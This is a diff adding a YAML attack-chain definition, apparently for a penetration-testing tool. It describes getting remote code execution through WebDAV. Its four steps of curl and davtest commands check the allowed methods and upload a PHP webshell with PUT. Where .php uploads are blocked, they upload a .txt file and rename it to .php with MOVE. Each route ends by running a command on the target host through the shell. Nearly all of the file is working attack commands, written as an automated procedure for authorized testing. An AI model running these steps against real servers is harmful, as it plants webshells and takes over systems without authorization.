@@ -1,0 +1,42 @@
+chain_id: webdav_put_to_rce
+title: "WebDAV — PUT a payload, MOVE to executable extension"
+severity: HIGH
+tags: [web, webdav, put, rce, davtest]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/(webdav|dav|davlocker)" }
+    - { banner_pattern: "(?i)dav" }
+
+description: |
+  WebDAV is a write-enabled HTTP extension. When PUT is allowed without
+  auth — or with weak default credentials — drop a webshell and request
+  it. If PUT to .php is blocked, MOVE a .txt upload to .php (server-side
+  rename, no fresh upload required).
+
+steps:
+  - id: 1
+    title: "Confirm the methods allowed"
+    command: |
+      curl -i -X OPTIONS http://$VICTIMA/webdav/
+      # Look for: Allow: GET, HEAD, POST, PUT, DELETE, MOVE, COPY, ...
+
+  - id: 2
+    title: "Run davtest for an automated probe"
+    command: davtest -url http://$VICTIMA/webdav/
+
+  - id: 3
+    title: "Manual PUT of a PHP webshell"
+    command: |
+      curl --upload-file shell.php -u USER:PASS http://$VICTIMA/webdav/shell.php
+      curl http://$VICTIMA/webdav/shell.php?cmd=id
+
+  - id: 4
+    title: "If PHP upload is blocked, PUT a .txt and MOVE it"
+    command: |
+      curl --upload-file shell.txt -u USER:PASS http://$VICTIMA/webdav/shell.txt
+      curl -u USER:PASS -X MOVE -H 'Destination: http://$VICTIMA/webdav/shell.php' http://$VICTIMA/webdav/shell.txt
+      curl http://$VICTIMA/webdav/shell.php?cmd=id
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
